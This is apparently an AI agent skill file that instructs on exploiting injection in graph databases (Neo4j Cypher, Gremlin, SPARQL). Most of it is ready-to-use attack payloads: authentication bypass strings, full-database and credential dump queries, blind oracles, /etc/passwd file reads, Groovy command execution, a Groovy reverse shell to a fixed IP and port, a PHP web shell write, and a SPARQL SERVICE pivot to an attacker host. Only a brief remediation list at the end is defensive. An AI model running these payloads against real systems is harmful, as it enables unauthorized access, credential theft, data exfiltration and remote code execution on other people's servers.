---
name: graph-injection
description: Exploit graph database query injection (Neo4j Cypher, Gremlin, SPARQL) to bypass auth, extract full graph data, and achieve code execution on the database host.
---

# Graph Database Injection (Cypher / Gremlin / SPARQL)

## When to use this skill

- The backend runs a graph database — detect via API fields shaped like nodes/edges (`"inEdges"`, `"outV"`, `relationships[]`, `properties: {…}`), GraphQL resolvers backed by Neo4j, or social/recommendation/identity features ("friends of friends", "related products", permission trees).
- Error text leaks the engine: `Neo.ClientError`, `org.neo4j.*`, `CypherSyntaxException`, `groovy.lang.MissingMethodException`, `org.apache.tinkerpop.gremlin`, `SPARQL Query Syntax Error`, `Virtuoso`, `Apache Jena`, `Blazegraph`, `RDF` terms.
- Login, search, or filtering accepts strings interpolated straight into a Cypher/Gremlin/SPARQL query.
- You already found Neo4j/Gremlin/SPARQL ports exposed (7474/7687, 8182, 7200) — this skill pairs with network-level access.

## Core concept

Graph query languages build queries by string concatenation just like SQL did for decades. The classic vulnerable pattern is a string literal broken out of quotes:

```cypher
// app builds:
MATCH (u:User {name: '<INPUT>' AND password: '<HASH>'}) RETURN u
// input  ' OR 1=1 RETURN u //  yields:
MATCH (u:User {name: '' OR 1=1 RETURN u //'}) RETURN u
```

The injected clause terminates the literal, adds a predicate or clause that is always true, then comments out the remainder with `//` (Cypher/Gremlin) or `#` (SPARQL). Unlike SQL, graph languages make **structure traversal** injectable — you can walk the whole graph from any node, which is what makes extraction one-shot and authorization bypass total.

## Exploitation Steps

### 1. Detection & fingerprinting

Probe every interpolating parameter with syntax-breakers and watch for engine-specific errors:

```
'                      →  unterminated string error from the engine
\                      →  escaping error
"                      →  double-quote variant (some layers use "…")
' OR 1=1 //            →  auth bypass / different result set
' MATCH (n) RETURN 1 //→  valid query executed → confirmed injection
```

Fingerprint by error surface:

```
Neo4j          → Neo.ClientError.Statement.SyntaxError, "Invalid input"
Gremlin        → org.apache.tinkerpop.gremlin…, groovy errors, "ScriptEvaluation"
SPARQL/Jena    → "SPARQL Query…syntax error", Virtuoso: "VUxxx", Jena: "ARQ"
Memgraph       → same syntax as Neo4j (Bolt + `!` in some spots)
```

HTTP-level: if the target exposes the Neo4j HTTP API (7474), POST raw queries directly:

```bash
curl -s -u neo4j:neo4j -H 'Content-Type: application/json' \
  -d '{"statements":[{"statement":"MATCH (n) RETURN count(n)"}]}' \
  http://target:7474/db/neo4j/tx/commit
```

### 2. Cypher (Neo4j) exploitation

Authentication bypass — replace the password predicate with an always-true traversal:

```
' OR 1=1 RETURN u //
' OR true RETURN u //
' WITH u LIMIT 1 RETURN u //
```

Comment syntax: `//` single-line, `/* */` block, `/**/` minimal. Terminate the injected clause then append your own:

```
' RETURN 1 //                         (early return)
' WITH u MATCH (x)-[r]->(y) RETURN x,r,y //
```

Data extraction — iterate labels, property keys, and values from the meta-graph:

```
' MATCH (n) RETURN labels(n) LIMIT 10 //
' MATCH (n) WHERE keys(n) RETURN keys(n) LIMIT 5 //
' MATCH (n:User) RETURN n.name, n.password LIMIT 50 //
' MATCH (n) RETURN DISTINCT labels(n), count(*) //
```

Full-dump one-shot (concatenate all node data into a single result to dodge pagination/limits):

```
' MATCH (n) WITH collect(n) AS all RETURN reduce(s='', x IN all | s + toString(x)) //
```

Path discovery & privilege-graph recon (useful for authorization-model attacks):

```
' MATCH (a:User {name:"me"})-[r*1..4]-(b) RETURN b //
' MATCH p=(n)-[*..3]->(m) WHERE m.admin=true RETURN p //
```

Write/rare but real — modification and file primitives (needs Neo4j <4.x or APOC plugin):

```
' CREATE (n:Evil {x:1}) //
' MATCH (n:User) SET n.pwned=true //
' CALL apoc.util.sleep(5000) //                          (time-based blind)
' CALL db.labels() YIELD label RETURN label //
' LOAD CSV WITH HEADERS FROM 'file:///etc/passwd' AS l RETURN l //   (local file read, if not disabled)
```

Blind boolean oracle (when errors are suppressed but results differ):

```
' AND (n.password STARTS WITH 'a') RETURN n //
' MATCH (u:User {name:'admin'}) WHERE u.password STARTS WITH 'p' RETURN 1 //
```

Time-based blind when nothing else works: `apoc.util.sleep(ms)` or heavy cartesian product `MATCH (a),(b),(c) RETURN count(*)` sized until delay is measurable.

### 3. Gremlin / TinkerPop exploitation

Gremlin is evaluated server-side — historically as **Groovy**, meaning string injection is *code* injection. Newer engines restrict to string-only traversal bytecode; older/naive deployments (`gremlin-groovy` script engine on port 8182, or HTTP/WS endpoints passing strings to `eval`) are RCE.

Classic auth bypass in string-built traversals:

```groovy
// app: g.V().has('name', '<INPUT>').toList()
// input:  admin'); g.V().toList(); ($x=//
x'); g.V().toList(); ($x=   →  terminates, injects a second traversal, comments the rest
```

Groovy-level payload ladder — escalate from info to RCE:

```groovy
// Fingerprint + info
1+1
System.getProperties()
// File read
new File('/etc/passwd').text
// Command execution (Groovy)
"whoami".execute().text
['id'].execute().text
// Reverse shell (Groovy)
String host="1.2.3.4";int port=4444;
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
p.getInputStream().transferTo(s.getOutputStream());s.getInputStream().transferTo(p.getOutputStream());
// File write
new File('/var/www/html/shell.php').text='<?php system($_GET[0]);'
```

Pure-traversal (non-Groovy) injection when the engine is locked down — inject into `has()` predicates:

```
admin')                      → break out
admin' || true)              → predicate bypass
admin').has('x','x           → reshape traversal
```

If Gremlin Server (8182) is reachable directly, POST `application/vnd.gremlin-v3.0+json` with a script body and skip the app entirely. Default credentials `HIDDEN`/`HIDDEN` on unconfigured Gremlin Server.

### 4. SPARQL exploitation

SPARQL backs RDF triplestores (Virtuoso, Jena/Fuseki, Blazegraph, GraphDB, Stardog). Comment syntax is `#`; injection usually sits in a `FILTER` or graph-URI parameter.

```
# app: FILTER(?name = '<INPUT>')
a' || true || 'b          →  string concat bypass (SPARQL uses ||)
a') || (true              →  close the bracket, always-true
a') ; #                    →  query-terminate (if SELECT-injection allowed)
a' UNION SELECT ?x ?y { ?x ?p ?y } #
```

Full-dump patterns:

```sparql
# everything, everywhere
SELECT ?s ?p ?o WHERE { ?s ?p ?o } LIMIT 100000
# cross-graph if named graphs exist
SELECT ?g ?s ?p ?o WHERE { GRAPH ?g { ?s ?p ?o } }
# username enumeration via boolean oracle
SELECT ?u WHERE { ?u a :User . ?u :name "admin" . ?u :pass ?p . FILTER(STRSTARTS(STR(?p), "a")) }
```

SPARQL Protocol is a *feature*: if the endpoint is exposed, wrap anything in an arbitrary query. Federated/`SERVICE` injection can pivot the server to attack third parties:

```sparql
SELECT * WHERE { SERVICE <http://attacker:8080/sparql> { ?s ?p ?o } }
```

Virtuoso-specific: `/sparql?query=` + `format=text/x-sparql+html`; blind via `bif:contains` errors; older Virtuoso exposes `SELECT` into SQL engine procs → file read/SSRF primitives. Jena/Fuseki: `$/` admin endpoints, default no-auth on unauthenticated deploys → dataset upload = stored data poisoning.

## Verification & Deliverables

- **Confirmed**: an injected traversal/query returning data that the original query could never return — capture the raw request + response pair. For blind, show the boolean oracle flipping (same request, `a` vs `b` prefix, different responses/timings).
- **Impact**: full graph dump (users, credentials, permissions, relationships = authorization model disclosed), authentication bypass, tenant/ACL traversal, Groovy RCE on Gremlin, file read/write via APOC, privilege escalation through privilege-graph edges.
- **Remediation**: parameterized queries / prepared transactions everywhere (Cypher `$param`, Gremlin bindings not concatenation, SPARQL prepared queries); drop Groovy script engines from Gremlin Server; least-privilege DB roles (deny write/APOC/file-procs); disable `LOAD CSV`/file access; WAF is not a fix — graph languages have no escaping standard; upgrade Neo4j ≥4.x with `dbms.security.procedures.unrestricted` empty.
- **Artifacts**: fingerprint evidence, injection request/response pairs, dumped schema (`labels()`, `db.labels()` output), extracted records, RCE/LoR proof, remediation notes.
